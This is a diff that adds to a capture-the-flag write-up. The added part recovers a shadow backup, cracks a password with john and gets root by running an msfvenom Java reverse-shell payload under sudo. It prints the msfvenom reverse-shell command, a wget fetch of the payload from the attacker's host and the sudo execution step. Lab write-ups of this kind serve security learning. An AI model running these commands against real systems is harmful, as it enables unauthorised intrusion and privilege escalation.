@@ -56,3 +56,45 @@ Listening to the given port,1234 as given in the exploit in this case,I opened t
 And,yes we get a shell and I was logged in as 'web'
 
 ![](/images/dotjar5.png)
+
+After searching a bit we found a backup file of shadow in the /var/backups folder so we copied it to /tmp and gunzipped it to retrieve the shadow file.
+
+![](/images/jar.png)
+
+Then we cracked the password hash for jdk-admin using john and logged in as jdk-admin
+
+![](/images/jar2.png)
+
+Now we can view the user flag..
+
+![](/images/jar3.png)
+
+After doinng `*sudo -l*` we found that we have root permissions to run any java file.
+
+![](/images/jar4.png)
+
+So we created an exploit using msfvenom 
+
+```py
+msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar
+```
+Then i opened a http-server and transferred the payload to the shell using wget 
+
+![](/images/jar5.png)
+
+```py
+python3 -m http.server 80
+wget <local ip>/pwn.jar --output-document=pwn.jar
+```
+And opened a listening port 1234 in my terminal and ran the .jar file in the shell.Thus we got the root access 
+
+```py
+sudo /usr/bin/java -jar pwn.jar
+```
+Now we can view the root flag as well!!
+
+![](/images/jar6.png)
+
+
+
+
